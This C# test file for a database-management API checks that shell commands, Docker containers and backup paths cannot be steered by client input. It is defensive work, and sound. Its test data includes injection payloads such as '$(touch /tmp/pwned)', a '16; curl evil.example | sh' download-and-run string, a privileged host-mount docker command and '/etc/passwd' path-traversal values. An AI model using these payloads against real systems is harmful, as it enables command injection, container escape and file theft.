using System.Net;
using System.Net.Http.Json;
using System.Text.RegularExpressions;
using AuroraDbManager.Api.Application.Backups;
using AuroraDbManager.Api.Domain.Backups;
using AuroraDbManager.Api.Domain.Databases;
using AuroraDbManager.Api.Domain.Instances;
using AuroraDbManager.Api.Infrastructure.Backups;
using AuroraDbManager.Api.Infrastructure.Backups.S3;
using AuroraDbManager.Api.Infrastructure.Docker;
using AuroraDbManager.Api.Tests.Backups;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;
using static AuroraDbManager.Api.Tests.ApiClientExtensions;

namespace AuroraDbManager.Api.Tests.Security;

/// <summary>
/// The boundaries between what a client sends and what Aurora runs or writes: programs are
/// started directly with separate arguments and never through a shell, Docker resources are
/// named and chosen by Aurora alone, and backup files and objects are placed by ids alone.
/// </summary>
public sealed partial class ExecutionAndPathSafetyTests : IDisposable
{
    private readonly ApiFactory _factory = new()
    {
        ConfigureBackups = options =>
        {
            options.S3.Bucket = FakeS3ObjectStore.Bucket;
            options.S3.Region = "us-east-1";
            options.S3.Prefix = "aurora/prod";
        }
    };

    private readonly HttpClient _client;

    public ExecutionAndPathSafetyTests()
    {
        _client = _factory.CreateClient();
    }

    public void Dispose()
    {
        _client.Dispose();
        _factory.Dispose();
    }

    public static TheoryData<string> ShellPayloads => new()
    {
        "$(touch /tmp/pwned)",
        "`touch /tmp/pwned`",
        "app; touch /tmp/pwned",
        "app && touch /tmp/pwned",
        "app || touch /tmp/pwned",
        "app > /tmp/pwned",
        "app < /etc/passwd",
        "app\ntouch /tmp/pwned",
        "app | cat /etc/passwd",
        "--help",
        "-f/etc/passwd",
        "app --file=/etc/passwd",
        "app'; DROP DATABASE postgres; --",
        "app\"",
        "../../etc/passwd",
        "app\u0000"
    };

    // --- Names never reach a program unless they are plain names -------------------------------

    [Theory]
    [MemberData(nameof(ShellPayloads))]
    public async Task DatabaseName_WithShellMetacharacters_IsRefused_BeforeAnythingIsStoredOrRun(string name)
    {
        var instanceId = await _factory.CreateRunningInstanceAsync(_client);

        var response = await _client.PostAsJsonAsync(InstanceDatabasesUrl(instanceId), new { name });

        Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
        Assert.NotNull(DatabaseName.Validate(name));
        Assert.Throws<ArgumentException>(() => Database.Create(instanceId, name, DateTime.UtcNow));
        Assert.Equal(0, await _factory.WithDbAsync(db => db.Databases.CountAsync()));
        Assert.Equal(0, _factory.DumpTools.RunCount);
    }

    [Theory]
    [InlineData("postgres")]
    [InlineData("mysql")]
    public async Task BackupAndRestorePrograms_AreStartedDirectly_WithTheDatabaseNameAsOneArgument_AndNoPasswordInAny(string engine)
    {
        var instanceId = await _factory.CreateRunningInstanceAsync(_client, engine: engine);
        var databaseId = await _factory.CreateReadyDatabaseAsync(_client, instanceId, "orders_2026");
        var password = await _factory.AdminPasswordAsync(instanceId);
        var backupId = await _factory.CreateCompletedBackupAsync(_client, databaseId);
        await _factory.ProcessJobAsync(await ApiFactory.RequestRestoreAsync(_client, backupId));

        var runs = _factory.DumpTools.Runs;
        Assert.True(runs.Count >= 2);
        string[] tools = ["pg_dump", "pg_restore", "mysqldump", "mysql"];
        foreach (var run in runs)
        {
            // The program itself, by its configured name: never a shell that is handed a command line.
            Assert.Contains(run.Executable, tools);
            Assert.DoesNotContain(run.Arguments, argument => argument is "-c" or "/c" or "sh" or "bash");

            // Every argument is one option or one value; none is a command line to be split again.
            Assert.All(run.Arguments, argument => Assert.DoesNotContain('\n', argument));

            // The password travels in a private file named by an argument or a variable, never in either.
            Assert.All(run.Arguments, argument => Assert.DoesNotContain(password, argument, StringComparison.Ordinal));
            Assert.All(run.Environment.Values, value => Assert.DoesNotContain(password, value, StringComparison.Ordinal));
        }

        // The name is an argument of its own, or the whole value of one option.
        var dump = runs[0];
        Assert.Contains(dump.Arguments, argument => argument is "orders_2026" or "--dbname=orders_2026");
        if (engine == "mysql")
        {
            // After "--", so that even a name starting with a dash could only ever be a name.
            Assert.Equal("--", dump.Arguments[^2]);
            Assert.Equal("orders_2026", dump.Arguments[^1]);
        }
    }

    [Fact]
    public async Task RealProcessRunner_HandsShellMetacharactersToTheProgramAsText_AndRunsNoneOfThem()
    {
        var directory = Directory.CreateTempSubdirectory("aurora-shell-safety-").FullName;
        try
        {
            var sentinel = Path.Combine(directory, "pwned");
            string[] arguments =
            [
                $"$(touch {sentinel})",
                $"`touch {sentinel}`",
                $"; touch {sentinel}",
                $"&& touch {sentinel}",
                $"|| touch {sentinel}",
                $"> {sentinel}",
                $"| tee {sentinel}",
                $"\ntouch {sentinel}\n",
                $"${{IFS}}touch${{IFS}}{sentinel}"
            ];

            // A program that only prints its arguments. Were a shell involved, any one of them would create the file.
            var result = await new SystemProcessRunner().RunAsync(
                new ProcessRequest("/usr/bin/printf", ["%s\\0", .. arguments], new Dictionary<string, string>(), TimeSpan.FromSeconds(30)),
                default);

            Assert.Equal(0, result.ExitCode);
            Assert.Equal(arguments, result.StandardOutput.Split('\0', StringSplitOptions.RemoveEmptyEntries));
            Assert.False(File.Exists(sentinel), "An argument was executed.");
            Assert.Empty(Directory.GetFileSystemEntries(directory));
        }
        finally
        {
            Directory.Delete(directory, recursive: true);
        }
    }

    [Fact]
    public void Source_StartsProgramsInOnePlace_WithoutAShell_AndNamesNoShellAnywhere()
    {
        var root = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "..", "src", "AuroraDbManager.Api"));
        var sources = Directory.GetFiles(root, "*.cs", SearchOption.AllDirectories)
            .Where(file => !file.Contains($"{Path.DirectorySeparatorChar}obj{Path.DirectorySeparatorChar}") && !file.Contains($"{Path.DirectorySeparatorChar}bin{Path.DirectorySeparatorChar}"))
            .ToDictionary(file => Path.GetRelativePath(root, file), File.ReadAllText);
        Assert.True(sources.Count > 50);

        // One place starts processes, and it does so without a shell and with an argument list.
        var starters = sources.Where(source => source.Value.Contains("new ProcessStartInfo", StringComparison.Ordinal)).Select(source => source.Key).ToList();
        Assert.Equal([Path.Combine("Infrastructure", "Backups", "SystemProcessRunner.cs")], starters);
        var runner = sources[starters[0]];
        Assert.Contains("UseShellExecute = false", runner, StringComparison.Ordinal);
        Assert.Contains("ArgumentList.Add", runner, StringComparison.Ordinal);
        Assert.DoesNotContain(".Arguments =", runner, StringComparison.Ordinal);

        foreach (var (file, text) in sources)
        {
            Assert.False(text.Contains("UseShellExecute = true", StringComparison.Ordinal), $"{file} starts a process through the shell.");
            Assert.False(ShellLiteral().IsMatch(text), $"{file} names a shell.");
            Assert.False(text.Contains("Process.Start(", StringComparison.Ordinal), $"{file} starts a process on its own.");
        }

        // Commands run inside containers are the two fixed readiness commands and nothing else.
        var execCallers = sources.Where(source => source.Value.Contains("docker.ExecAsync(", StringComparison.Ordinal)).Select(source => source.Key).Order().ToList();
        Assert.Equal(
            [Path.Combine("Infrastructure", "Docker", "DockerInstanceProvisioner.cs"), Path.Combine("Infrastructure", "Docker", "DockerInstanceRuntimeProbe.cs")],
            execCallers);
        Assert.All(execCallers, file => Assert.Contains("image.ReadinessCommand", sources[file], StringComparison.Ordinal));
    }

    [GeneratedRegex("\"(/bin/)?(ba|z|da)?sh\"|\"cmd(\\.exe)?\"|\"powershell|\"-c\"|\"/c\"")]
    private static partial Regex ShellLiteral();

    // --- Docker -------------------------------------------------------------------------------

    [Fact]
    public void ReadinessCommands_AreFixed_AndContainNothingOfAnInstance()
    {
        var resolver = new DockerImageResolver();
        foreach (var (engine, expected) in new[]
                 {
                     (InstanceEngine.Postgres, "pg_isready -q -h 127.0.0.1 -p 5432"),
                     (InstanceEngine.Mysql, "mysqladmin ping --silent -h 127.0.0.1 -P 3306")
                 })
        {
            foreach (var version in DockerImageResolver.SupportedVersions(engine))
            {
                Assert.Equal(expected, string.Join(' ', resolver.Resolve(engine, version).ReadinessCommand));
            }
        }
    }

    [Theory]
    [InlineData("16; curl evil.example | sh")]
    [InlineData("latest")]
    [InlineData("16 --privileged")]
    [InlineData("../evil/image:1")]
    [InlineData("evil.example/postgres:16")]
    [InlineData("16@sha256:0000")]
    [InlineData("")]
    public async Task Version_ThatIsNotInTheCatalog_NeverBecomesAnImageReference(string version)
    {
        using var factory = new ApiFactory { UseDockerProvisioner = true };
        using var client = factory.CreateClient();

        var response = await client.PostAsJsonAsync(InstancesUrl, ValidInstanceRequest(version: version));
        if (response.StatusCode == HttpStatusCode.Accepted)
        {
            var jobId = (await response.ReadJsonAsync()).GetProperty("job").GetProperty("id").GetGuid();
            await factory.ProcessJobAsync(jobId);
            var job = await client.GetJobAsync(jobId);
            Assert.Equal("failed", job.Status());
            Assert.Equal("UNSUPPORTED_DATABASE_VERSION", job.GetProperty("error").GetProperty("code").GetString());
        }
        else
        {
            Assert.Equal(HttpStatusCode.BadRequest, response.StatusCode);
        }

        // Docker was asked for no image and created nothing.
        Assert.Empty(factory.Docker.Images);
        Assert.Empty(factory.Docker.Containers);
        Assert.Equal(0, factory.Docker.CountCalls(nameof(IDockerEngine.PullImageAsync)));
        Assert.Equal(0, factory.Docker.CountCalls(nameof(IDockerEngine.CreateContainerAsync)));
    }

    [Fact]
    public async Task ContainerVolumeLabelsAndNetwork_ComeFromTheInstanceIdAndTheConfiguration_NeverFromWhatTheClientSent()
    {
        const string hostile = "x; docker run -v /:/host --privileged alpine";
        using var factory = new ApiFactory { UseDockerProvisioner = true };
        using var client = factory.CreateClient();
        var (instanceId, jobId) = await client.CreateInstanceAsync(name: hostile);
        await factory.ProcessJobAsync(jobId);
        Assert.Equal("running", (await client.GetInstanceAsync(instanceId)).Status());

        var spec = factory.Docker.LastCreatedSpec!;
        Assert.Equal($"aurora-instance-{instanceId:D}", spec.Name);
        Assert.Equal($"aurora-instance-{instanceId:D}-data", spec.VolumeName);
        Assert.Equal("postgres:16", spec.Image);
        Assert.Equal("/var/lib/postgresql/data", spec.VolumeTarget);
        Assert.Equal("aurora-db", spec.NetworkName);
        Assert.Equal(
            new Dictionary<string, string> { ["aurora.managed"] = "true", ["aurora.instance-id"] = instanceId.ToString("D") },
            spec.Labels);
        // The environment is the administrator password under the image's own variable, and nothing else.
        Assert.Equal(["POSTGRES_PASSWORD"], spec.Environment.Keys);

        // The name the client chose is in none of it, and in no call made to Docker.
        Assert.DoesNotContain(hostile, spec.ToString(), StringComparison.Ordinal);
        Assert.All(factory.Docker.Calls, call => Assert.DoesNotContain("docker run", call, StringComparison.Ordinal));
        Assert.All(factory.Docker.Calls, call => Assert.DoesNotContain("/host", call, StringComparison.Ordinal));
    }

    [Fact]
    public void ContainerSpec_HasNoWayToAskForAHostPath_APort_OrPrivileges()
    {
        // What a container is created from is exactly this, and none of it is a bind mount, a
        // published port, a capability or a privilege. A new member here is a decision to review.
        var properties = typeof(DockerContainerSpec).GetProperties().Select(property => property.Name).Order();

        Assert.Equal(
            ["Environment", "Image", "Labels", "MemoryBytes", "Name", "NanoCpus", "NetworkName", "VolumeName", "VolumeTarget"],
            properties);
    }

    [Fact]
    public async Task CreateInstance_IgnoresFieldsThatWouldReachTheHost()
    {
        using var factory = new ApiFactory { UseDockerProvisioner = true };
        using var client = factory.CreateClient();

        var response = await client.PostAsJsonAsync(InstancesUrl, new
        {
            name = "production-db",
            engine = "postgres",
            version = "16",
            cpu = 1,
            memoryMb = 512,
            storageGb = 1,
            image = "evil.example/rootkit:latest",
            privileged = true,
            binds = new[] { "/:/host", "/var/run/docker.sock:/var/run/docker.sock" },
            networkMode = "host",
            env = new[] { "LD_PRELOAD=/host/evil.so" },
            volumes = new[] { "/etc" }
        });
        var jobId = (await response.ReadJsonAsync(HttpStatusCode.Accepted)).GetProperty("job").GetProperty("id").GetGuid();
        await factory.ProcessJobAsync(jobId);

        var spec = factory.Docker.LastCreatedSpec!;
        Assert.Equal("postgres:16", spec.Image);
        Assert.Equal("aurora-db", spec.NetworkName);
        Assert.Equal(["POSTGRES_PASSWORD"], spec.Environment.Keys);
        Assert.StartsWith("aurora-instance-", spec.VolumeName);
    }

    // --- Backup paths and object keys ----------------------------------------------------------

    [Fact]
    public void BackupPaths_AreBuiltFromIdsAlone_AndAlwaysLieUnderTheBackupRoot()
    {
        var storage = _factory.Services.GetRequiredService<LocalBackupStorage>();
        var root = Path.GetFullPath(_factory.BackupRoot) + Path.DirectorySeparatorChar;

        foreach (var instanceId in new[] { Guid.Empty, Guid.NewGuid(), Guid.Parse("ffffffff-ffff-ffff-ffff-ffffffffffff") })
        {
            foreach (var extension in new[] { "dump", "sql" })
            {
                var location = new BackupLocation(instanceId, Guid.NewGuid(), Guid.NewGuid(), extension);
                var path = storage.PathFor(location);

                Assert.StartsWith(root, path, StringComparison.Ordinal);
                Assert.Equal(path, Path.GetFullPath(path));
                Assert.DoesNotContain("..", path, StringComparison.Ordinal);
                Assert.Equal(
                    Path.Combine("instances", location.InstanceId.ToString("D"), "databases", location.DatabaseId.ToString("D"), $"{location.BackupId:D}.{extension}"),
                    Path.GetRelativePath(root, path));
            }
        }
    }

    [Theory]
    [InlineData("../../../etc/passwd")]
    [InlineData("dump/../../../../etc/cron.d/x")]
    [InlineData("/etc/passwd")]
    [InlineData("dump\u0000.txt")]
    [InlineData("..")]
    [InlineData("")]
    [InlineData("dump.partial")]
    [InlineData("DUMP")]
    [InlineData("d u m p")]
    public void ExtensionThatCouldLeaveTheRoot_OrPassAsSomethingElse_IsRefusedByBothStorages(string extension)
    {
        var location = new BackupLocation(Guid.NewGuid(), Guid.NewGuid(), Guid.NewGuid(), extension);

        Assert.Throws<ArgumentException>(() => _factory.Services.GetRequiredService<LocalBackupStorage>().PathFor(location));
        Assert.Throws<ArgumentException>(() => _factory.Services.GetRequiredService<S3BackupStorage>().KeyFor(location));
    }

    [Fact]
    public void ObjectKeys_AreBuiltFromThePrefixAndIdsAlone()
    {
        var location = new BackupLocation(Guid.NewGuid(), Guid.NewGuid(), Guid.NewGuid(), "dump");

        var key = _factory.Services.GetRequiredService<S3BackupStorage>().KeyFor(location);

        Assert.Equal(
            $"aurora/prod/backups/instances/{location.InstanceId:D}/databases/{location.DatabaseId:D}/{location.BackupId:D}.dump",
            key);
        Assert.Equal(key, _factory.Services.GetRequiredService<S3BackupStorage>().KeyFor(location));
    }

    [Theory]
    [InlineData("../other-tenant")]
    [InlineData("a/../../b")]
    [InlineData("a//b")]
    [InlineData("a\\b")]
    [InlineData("a\nb")]
    public void ObjectKeyPrefix_ThatIsNotAPlainPrefix_IsRefusedAtStartup(string prefix)
    {
        var options = new S3BackupOptions { Bucket = "bucket", Region = "us-east-1", Prefix = prefix };

        Assert.Contains("Backups:S3:Prefix", options.Validate(), StringComparison.Ordinal);
    }

    [Fact]
    public async Task BackupRequest_TakesNoPathKeyOrBucket_WhateverTheClientSends()
    {
        var instanceId = await _factory.CreateRunningInstanceAsync(_client);
        var databaseId = await _factory.CreateReadyDatabaseAsync(_client, instanceId, "app");

        var response = await _client.PostAsJsonAsync(DatabaseBackupsUrl(databaseId), new
        {
            path = "/etc/cron.d/aurora",
            key = "../../other/key",
            bucket = "someone-elses-bucket",
            storageType = "s3",
            extension = "sh"
        });
        var body = await response.ReadJsonAsync(HttpStatusCode.Accepted);
        await _factory.ProcessJobAsync(body.GetProperty("job").GetProperty("id").GetGuid());
        var backupId = body.GetProperty("backup").GetProperty("id").GetGuid();

        var backup = await _factory.WithDbAsync(db => db.Backups.AsNoTracking().SingleAsync(b => b.Id == backupId));
        Assert.Equal(BackupStatus.Completed, backup.Status);
        Assert.Equal(BackupStorageType.Local, backup.StorageType);
        Assert.Equal(_factory.BackupFilePath(instanceId, databaseId, backupId, "dump"), backup.Path);
        Assert.Equal([backup.Path!], _factory.BackupFiles());
        Assert.False(File.Exists("/etc/cron.d/aurora"));
        Assert.Equal(0, _factory.ObjectStore.UploadCount);

        // And the response never says where the artifact is.
        var text = await (await _client.GetAsync($"{BackupsUrl}/{backupId}")).Content.ReadAsStringAsync();
        Assert.DoesNotContain(_factory.BackupRoot, text, StringComparison.Ordinal);
        Assert.DoesNotContain("\"path\"", text, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task BackupFilesAndDirectories_AreTheOwnersOnly_AndAnUnfinishedFileIsNeverABackup()
    {
        if (OperatingSystem.IsWindows())
        {
            return;
        }

        var instanceId = await _factory.CreateRunningInstanceAsync(_client);
        var databaseId = await _factory.CreateReadyDatabaseAsync(_client, instanceId, "app");
        var backupId = await _factory.CreateCompletedBackupAsync(_client, databaseId);
        var path = _factory.BackupFilePath(instanceId, databaseId, backupId, "dump");

        Assert.Equal(UnixFileMode.UserRead | UnixFileMode.UserWrite, File.GetUnixFileMode(path));
        for (var directory = Path.GetDirectoryName(path)!; directory.Length > _factory.BackupRoot.Length; directory = Path.GetDirectoryName(directory)!)
        {
            Assert.Equal(UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.UserExecute, File.GetUnixFileMode(directory));
        }

        // A file left where a backup is being written is not a backup: not found, not downloadable.
        var storage = _factory.Services.GetRequiredService<LocalBackupStorage>();
        var unfinished = new BackupLocation(instanceId, databaseId, Guid.NewGuid(), "dump");
        await File.WriteAllBytesAsync(storage.PathFor(unfinished) + ".partial", FakeDumpTools.PostgresDump);
        Assert.Null(await storage.FindAsync(unfinished, default));
    }

    [Fact]
    public async Task RestoreStaging_StaysInsideItsOwnDirectory_AndIsRemovedAfterwards()
    {
        var instanceId = await _factory.CreateRunningInstanceAsync(_client);
        var databaseId = await _factory.CreateReadyDatabaseAsync(_client, instanceId, "app");
        var backupId = await _factory.CreateCompletedBackupAsync(_client, databaseId);
        var staged = new List<string>();
        _factory.DumpTools.OnRun = run =>
        {
            if (run.InputPath.Length > 0)
            {
                staged.Add(Path.GetFullPath(run.InputPath));
            }
        };

        var jobId = await ApiFactory.RequestRestoreAsync(_client, backupId);
        await _factory.ProcessJobAsync(jobId);

        Assert.Equal("completed", (await _client.GetJobAsync(jobId)).Status());
        Assert.NotEmpty(staged);
        var root = Path.GetFullPath(_factory.RestoreStagingRoot) + Path.DirectorySeparatorChar;
        Assert.All(staged, path => Assert.StartsWith(Path.Combine(root, jobId.ToString("D")) + Path.DirectorySeparatorChar, path, StringComparison.Ordinal));
        Assert.Empty(_factory.RestoreStagingEntries());
    }

    // --- S3 endpoint --------------------------------------------------------------------------

    [Theory]
    [InlineData("http://s3.internal.example", true)]
    [InlineData("http://10.0.0.9:9000", true)]
    [InlineData("https://s3.internal.example", false)]
    [InlineData("http://localhost:4566", false)]
    [InlineData("http://127.0.0.1:9000", false)]
    [InlineData("", false)]
    [InlineData(null, false)]
    public void PlainHttpEndpointOnAnotherMachine_IsRecognised_SoItCanBeWarnedAbout(string? endpoint, bool expected)
    {
        Assert.Equal(expected, AwsS3ObjectClient.IsPlainHttpToAnotherMachine(endpoint));
    }

    [Theory]
    [InlineData("ftp://s3.example")]
    [InlineData("file:///etc/passwd")]
    [InlineData("s3.example")]
    [InlineData("javascript:alert(1)")]
    public void S3Endpoint_ThatIsNotHttpOrHttps_IsRefusedAtStartup(string endpoint)
    {
        var options = new S3BackupOptions { Bucket = "bucket", Region = "us-east-1", Endpoint = endpoint };

        Assert.Contains("Backups:S3:Endpoint", options.Validate(), StringComparison.Ordinal);
    }
}
